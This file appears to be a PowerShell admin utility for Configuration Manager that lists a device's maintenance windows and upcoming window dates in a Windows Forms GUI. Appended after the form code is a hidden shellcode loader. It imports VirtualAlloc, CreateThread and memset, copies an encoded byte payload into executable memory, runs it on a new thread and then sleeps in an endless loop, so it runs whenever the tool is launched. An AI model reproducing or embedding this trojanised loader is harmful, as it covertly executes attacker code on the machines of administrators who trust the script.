[CmdletBinding()]
param(
[parameter(Mandatory=$true)]
$SiteServer,
[parameter(Mandatory=$true)]
$SiteCode,
[parameter(Mandatory=$true)]
$ResourceID
)

function Load-Form {
    $Form.Controls.Add($DGVResults1)
    $Form.Controls.Add($DGVResults2)
    $Form.Controls.Add($GBMW)
    $Form.Controls.Add($GBMWUpcoming)
    $Form.Add_Shown({Get-CMMaintenanceWindowsInformation})
	$Form.Add_Shown({$Form.Activate()})
	[void]$Form.ShowDialog()
}

function Get-CMSiteCode {
    $CMSiteCode = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer | Select-Object -ExpandProperty SiteCode
    return $CMSiteCode
}

function Get-CMSchedule {
    param(
    $String
    )
    $WMIConnection = [WmiClass]"\\$($SiteServer)\root\SMS\site_$(Get-CMSiteCode):SMS_ScheduleMethods"
    $Schedule = $WMIConnection.psbase.GetMethodParameters("ReadFromString")
    $Schedule.StringData = $String
    $ScheduleData = $WMIConnection.psbase.InvokeMethod("ReadFromString",$Schedule,$null)
    $ScheduleInfo = $ScheduleData.TokenData
    return $ScheduleInfo
}

function Get-CMMaintenanceWindowsInformation {
    $CMSiteCode = Get-CMSiteCode
    $CurrentDateTime = (Get-Date)
    $AllMWDates = @()
    $DateArray = @()
    $CollectionIDs = Get-WmiObject -Namespace "root\SMS\site_$($CMSiteCode)" -Class SMS_FullCollectionMembership -ComputerName $SiteServer -Filter "ResourceID like '$($ResourceID)'"
    foreach ($CollectionID in $CollectionIDs) {
        $CollectionSettings = Get-WmiObject -Namespace "root\SMS\site_$($CMSiteCode)" -Class SMS_CollectionSettings -ComputerName $SiteServer -Filter "CollectionID='$($CollectionID.CollectionID)'"
        foreach ($CollectionSetting in $CollectionSettings) {
            $CollectionSetting.Get()
            foreach ($MaintenanceWindow in $CollectionSetting.ServiceWindows) {
                $StartTime = [Management.ManagementDateTimeConverter]::ToDateTime($MaintenanceWindow.StartTime)
                $DateArray += $MaintenanceWindow
                $CollectionName = Get-WmiObject -Namespace "root\SMS\site_$($CMSiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "CollectionID = '$($CollectionID.CollectionID)'" | Select-Object -ExpandProperty Name
                $DGVResults1.Rows.Add($MaintenanceWindow.Name,$CollectionName) | Out-Null
            }
        }
    }
    $SortedDateArray = $DateArray | Sort-Object -Property RecurrenceType | Select-Object Description, RecurrenceType, ServiceWindowSchedules, isEnabled
    $RecurrenceType1 = ($SortedDateArray | Where-Object { $_.RecurrenceType -eq 1 })
    if ($RecurrenceType1 -ne $null) {
        foreach ($R1RecurrenceType in $RecurrenceType1) {
            if ($R1RecurrenceType.IsEnabled -eq $true) {
                $R1Schedule = Get-CMSchedule -String $R1RecurrenceType.ServiceWindowSchedules
                $R1StartTime = [Management.ManagementDateTimeConverter]::ToDateTime($R1Schedule.StartTime)
                if ((Get-Date) -le $R1StartTime) {
                    $AllMWDates += $R1StartTime
                }
            }
        }
    }
    $RecurrenceType2 = ($SortedDateArray | Where-Object { $_.RecurrenceType -eq 2 })
    if ($RecurrenceType2 -ne $null) {
        foreach ($R2RecurrenceType in $RecurrenceType2) {
            if ($R2RecurrenceType.IsEnabled -eq $true) {
                $R2Schedule = Get-CMSchedule -String $R2RecurrenceType.ServiceWindowSchedules
                $R2StartTime = [Management.ManagementDateTimeConverter]::ToDateTime($R2Schedule.StartTime)
                $R2DaySpan = $R2Schedule.DaySpan
                $R2CurrentDate = (Get-Date)
                do {
                    $R2StartTime = $R2StartTime.AddDays($R2DaySpan)
                }
                until ($R2StartTime -ge $R2CurrentDate)
                if ((Get-Date) -le $R2StartTime) {
                    $AllMWDates += $R2StartTime
                }
            }
        }
    }
    $RecurrenceType3 = ($SortedDateArray | Where-Object { $_.RecurrenceType -eq 3 })
    if ($RecurrenceType3 -ne $null) {
        foreach ($R3RecurrenceType in $RecurrenceType3) {
            if ($R3RecurrenceType.IsEnabled -eq $true) {
                $R3Schedule = Get-CMSchedule -String $R3RecurrenceType.ServiceWindowSchedules
                $R3StartMin = [Management.ManagementDateTimeConverter]::ToDateTime($R3Schedule.StartTime) | Select-Object -ExpandProperty Minute
                $R3StartHour = [Management.ManagementDateTimeConverter]::ToDateTime($R3Schedule.StartTime) | Select-Object -ExpandProperty Hour
                $R3StartDay = $R3Schedule.Day
                switch ($R3StartDay) {
                    1 { $R3DayOfWeek = "Sunday" }
                    2 { $R3DayOfWeek = "Monday" }
                    3 { $R3DayOfWeek = "Tuesday" }
                    4 { $R3DayOfWeek = "Wednesday" }
                    5 { $R3DayOfWeek = "Thursday" }
                    6 { $R3DayOfWeek = "Friday" }
                    7 { $R3DayOfWeek = "Saturday" }
                }
                $R3WeekSpan = $R3Schedule.ForNumberOfWeeks
                switch ($R3WeekSpan) {
                    1 { $R3AddDays = 0 }
                    2 { $R3AddDays = 7 }
                    3 { $R3AddDays = 14 }
                    4 { $R3AddDays = 21 }
                }
                $R3CurrentDate = (Get-Date)
                $R3DaysUntil = 0
                While ($R3CurrentDate.DayOfWeek -ne "$($R3DayOfWeek)") {
                    $R3DaysUntil++
                    $R3CurrentDate = $R3CurrentDate.AddDays(1)
                }
                if ($R3StartHour -le 9) {
                    if ($R3StartMin -le 9) {
                        $R3DateTime = ([datetime]::ParseExact("0$($R3StartHour):0$($R3StartMin)","hh:mm",$null)).AddDays($R3DaysUntil).AddDays($R3AddDays)
                    }
                    elseif ($R3StartMin -ge 10) {
                        $R3DateTime = ([datetime]::ParseExact("0$($R3StartHour):$($R3StartMin)","hh:mm",$null)).AddDays($R3DaysUntil).AddDays($R3AddDays)
                    }
                }
                elseif ($R3StartHour -ge 10) {
                    if ($R3StartMin -le 9) {
                        $R3DateTime = ([datetime]::ParseExact("$($R3StartHour):0$($R3StartMin)","hh:mm",$null)).AddDays($R3DaysUntil).AddDays($R3AddDays)
                    }
                    elseif ($R3StartMin -ge 10) {
                        $R3DateTime = ([datetime]::ParseExact("$($R3StartHour):$($R3StartMin)","hh:mm",$null)).AddDays($R3DaysUntil).AddDays($R3AddDays)
                    }
                }
                if ((Get-Date) -le $R3DateTime) {
                    $AllMWDates += $R3DateTime
                }
            }
        }
    }
    $RecurrenceType4 = ($SortedDateArray | Where-Object { $_.RecurrenceType -eq 4 })
    if ($RecurrenceType4 -ne $null) {
        foreach ($R4RecurrenceType in $RecurrenceType4) {
            if ($R4RecurrenceType.IsEnabled -eq $true) {
                $R4Schedule = Get-CMSchedule -String $R4RecurrenceType.ServiceWindowSchedules
                $R4WeekOrder = $R4Schedule.WeekOrder
                $R4StartHour = [Management.ManagementDateTimeConverter]::ToDateTime($R4Schedule.StartTime) | Select-Object -ExpandProperty Hour
                $R4StartMin = [Management.ManagementDateTimeConverter]::ToDateTime($R4Schedule.StartTime) | Select-Object -ExpandProperty Minute
                $R4StartSec = [Management.ManagementDateTimeConverter]::ToDateTime($R4Schedule.StartTime) | Select-Object -ExpandProperty Second
                $R4WeekDay = $R4Schedule.Day
                switch ($R4WeekDay) {
                    1 { $R4DayOfWeek = "Sunday" }
                    2 { $R4DayOfWeek = "Monday" }
                    3 { $R4DayOfWeek = "Tuesday" }
                    4 { $R4DayOfWeek = "Wednesday" }
                    5 { $R4DayOfWeek = "Thursday" }
                    6 { $R4DayOfWeek = "Friday" }
                    7 { $R4DayOfWeek = "Saturday" }
                }
                if ($R4WeekOrder -ge 1) {
                    $R4Increment = 0
                    $R4Date = (Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day 1 -Hour $($R4StartHour) -Minute $($R4StartMin) -Second $($R4StartSec))
                    do {
                        $R4Increment++
                        $R4CalcDate = $R4Date.AddDays($R4Increment)
                        $R4CalcDayofWeek = $R4CalcDate.DayOfWeek
                    }
                    until ($R4CalcDayofWeek -like $R4DayOfWeek)
                    $R4CalcDateTime = $R4CalcDate
                    if ($R4WeekOrder -eq 1) {
                        $R4DateTime = $R4CalcDateTime
                    }
                    elseif ($R4WeekOrder -eq 2) {
                        $R4DateTime = $R4CalcDateTime.AddDays(7)
                    }
                    elseif ($R4WeekOrder -eq 3) {
                        $R4DateTime = $R4CalcDateTime.AddDays(14)
                    }
                    elseif ($R4WeekOrder -eq 4) {
                        $R4DateTime = $R4CalcDateTime.AddDays(21)
                    }
                }
                elseif ($R4WeekOrder -eq 0) {
                    $R4Decrement = 0
                    $R4Date = (Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day 1 -Hour $($R4StartHour) -Minute $($R4StartMin) -Second $($R4StartSec)).AddMonths(1)
                    do {
                        $R4Decrement++
                        $R4CalcDate = $R4Date.AddDays(-$R4Decrement)
                        $R4CalcDayofWeek = $R4CalcDate.DayOfWeek
                    }
                    until ($R4CalcDayofWeek -like $R4DayOfWeek)
                    $R4DateTime = $R4CalcDate
                }
                if ((Get-Date) -le $R4DateTime) {
                    $AllMWDates += $R4DateTime
                }
            }
        }
    }
    $RecurrenceType5 = ($SortedDateArray | Where-Object { $_.RecurrenceType -eq 5 })
    if ($RecurrenceType5 -ne $null) {
        foreach ($R5RecurrenceType in $RecurrenceType5) {
            if ($R5RecurrenceType.IsEnabled -eq $true) {
                $R5Schedule = Get-CMSchedule -String $R5RecurrenceType.ServiceWindowSchedules
                $R5StartTime = [Management.ManagementDateTimeConverter]::ToDateTime($R5Schedule.StartTime)
                $R5StartHour = $R5StartTime.Hour
                $R5StartMin = $R5StartTime.Minute
                $R5StartSec = $R5StartTime.Second
                $R5MonthSpan = $R5Schedule.ForNumberOfMonths
                $R5MonthDay = $R5Schedule.MonthDay
                if ($R5Schedule.MonthDay -ge 1) {
                    if ($R5MonthSpan -eq 1) {
                        $R5DateTime = ((Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day $($R5MonthDay) -Hour $($R5StartHour) -Minute $($R5StartMin) -Second $($R5StartSec))).DateTime
                    }
                    elseif ($R5MonthSpan -gt 1) {
                        $R5DateTime = ((Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day $($R5MonthDay) -Hour $($R5StartHour) -Minute $($R5StartMin) -Second $($R5StartSec)).AddMonths($R5MonthSpan)).DateTime
                    }
                }
                elseif ($R5Schedule.MonthDay -eq 0) {
                    $R5DateTime = ((Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day 1 -Hour $($R5StartHour) -Minute $($R5StartMin) -Second $($R5StartSec)).AddMonths($R5MonthSpan).AddDays(-1)).DateTime
                }
                if ((Get-Date) -le $R5DateTime) {
                    $AllMWDates += $R5DateTime
                }
            }
        }
    }
    $SortedDates = $AllMWDates | Sort-Object
    $SortedDates | ForEach-Object {
        $DGVResults2.Rows.Add($_)
    }
}


[void][System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 


$Form = New-Object System.Windows.Forms.Form    
$Form.Size = New-Object System.Drawing.Size(700,470)  
$Form.MinimumSize = New-Object System.Drawing.Size(700,470)
$Form.MaximumSize = New-Object System.Drawing.Size(700,470)
$Form.SizeGripStyle = "Hide"
$Form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($PSHome + "\powershell.exe")
$Form.Text = "Maintenance Window Tool 1.0"
$Form.ControlBox = $true
$Form.TopMost = $true


$DGVResults1 = New-Object System.Windows.Forms.DataGridView
$DGVResults1.Location = New-Object System.Drawing.Size(20,30)
$DGVResults1.Size = New-Object System.Drawing.Size(640,170)
$DGVResults1.ColumnCount = 2
$DGVResults1.ColumnHeadersVisible = $true
$DGVResults1.Columns[0].Name = "Maintenance Window Name"
$DGVResults1.Columns[0].AutoSizeMode = "Fill"
$DGVResults1.Columns[1].Name = "Collection Name"
$DGVResults1.Columns[1].AutoSizeMode = "Fill"
$DGVResults1.AllowUserToAddRows = $false
$DGVResults1.AllowUserToDeleteRows = $false
$DGVResults1.ReadOnly = $True
$DGVResults1.ColumnHeadersHeightSizeMode = "DisableResizing"
$DGVResults1.RowHeadersWidthSizeMode = "DisableResizing"
$DGVResults2 = New-Object System.Windows.Forms.DataGridView
$DGVResults2.Location = New-Object System.Drawing.Size(20,240)
$DGVResults2.Size = New-Object System.Drawing.Size(640,170)
$DGVResults2.ColumnCount = 1
$DGVResults2.ColumnHeadersVisible = $true
$DGVResults2.Columns[0].Name = "Upcoming Maintenance Windows"
$DGVResults2.Columns[0].AutoSizeMode = "Fill"
$DGVResults2.AllowUserToAddRows = $false
$DGVResults2.AllowUserToDeleteRows = $false
$DGVResults2.ReadOnly = $True
$DGVResults2.ColumnHeadersHeightSizeMode = "DisableResizing"
$DGVResults2.RowHeadersWidthSizeMode = "DisableResizing"


$GBMW = New-Object System.Windows.Forms.GroupBox
$GBMW.Location = New-Object System.Drawing.Size(10,10) 
$GBMW.Size = New-Object System.Drawing.Size(660,200) 
$GBMW.Text = "Maintenance Windows"
$GBMWUpcoming = New-Object System.Windows.Forms.GroupBox
$GBMWUpcoming.Location = New-Object System.Drawing.Size(10,220) 
$GBMWUpcoming.Size = New-Object System.Drawing.Size(660,200) 
$GBMWUpcoming.Text = "Upcoming Maintenance Windows"


Load-Form
$GmSQ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $GmSQ -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x92,0xbe,0xd3,0x05,0xda,0xd7,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x5e,0x13,0x03,0x5e,0x13,0x83,0xc6,0x96,0x5c,0x26,0xf9,0x7e,0x22,0xc9,0x02,0x7e,0x43,0x43,0xe7,0x4f,0x43,0x37,0x63,0xff,0x73,0x33,0x21,0xf3,0xf8,0x11,0xd2,0x80,0x8d,0xbd,0xd5,0x21,0x3b,0x98,0xd8,0xb2,0x10,0xd8,0x7b,0x30,0x6b,0x0d,0x5c,0x09,0xa4,0x40,0x9d,0x4e,0xd9,0xa9,0xcf,0x07,0x95,0x1c,0xe0,0x2c,0xe3,0x9c,0x8b,0x7e,0xe5,0xa4,0x68,0x36,0x04,0x84,0x3e,0x4d,0x5f,0x06,0xc0,0x82,0xeb,0x0f,0xda,0xc7,0xd6,0xc6,0x51,0x33,0xac,0xd8,0xb3,0x0a,0x4d,0x76,0xfa,0xa3,0xbc,0x86,0x3a,0x03,0x5f,0xfd,0x32,0x70,0xe2,0x06,0x81,0x0b,0x38,0x82,0x12,0xab,0xcb,0x34,0xff,0x4a,0x1f,0xa2,0x74,0x40,0xd4,0xa0,0xd3,0x44,0xeb,0x65,0x68,0x70,0x60,0x88,0xbf,0xf1,0x32,0xaf,0x1b,0x5a,0xe0,0xce,0x3a,0x06,0x47,0xee,0x5d,0xe9,0x38,0x4a,0x15,0x07,0x2c,0xe7,0x74,0x4f,0x81,0xca,0x86,0x8f,0x8d,0x5d,0xf4,0xbd,0x12,0xf6,0x92,0x8d,0xdb,0xd0,0x65,0xf2,0xf1,0xa5,0xfa,0x0d,0xfa,0xd5,0xd3,0xc9,0xae,0x85,0x4b,0xf8,0xce,0x4d,0x8c,0x05,0x1b,0xfb,0x89,0x91,0xfc,0x52,0x78,0xc0,0x95,0xa8,0x7b,0x13,0x3a,0x24,0x9d,0x43,0x92,0x66,0x32,0x23,0x42,0xc7,0xe2,0xcb,0x88,0xc8,0xdd,0xeb,0xb2,0x02,0x76,0x81,0x5c,0xfb,0x2e,0x3d,0xc4,0xa6,0xa5,0xdc,0x09,0x7d,0xc0,0xde,0x82,0x72,0x34,0x90,0x62,0xfe,0x26,0x44,0x83,0xb5,0x15,0xc2,0x9c,0x63,0x33,0xea,0x08,0x88,0x92,0xbd,0xa4,0x92,0xc3,0x89,0x6a,0x6c,0x26,0x82,0xa3,0xf8,0x89,0xfc,0xcb,0xec,0x09,0xfc,0x9d,0x66,0x0a,0x94,0x79,0xd3,0x59,0x81,0x85,0xce,0xcd,0x1a,0x10,0xf1,0xa7,0xcf,0xb3,0x99,0x45,0x36,0xf3,0x05,0xb5,0x1d,0x05,0x79,0x60,0x5b,0x73,0x93,0xb0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cEC=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cEC.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cEC,0,0,0);for (;;){Start-sleep 60};

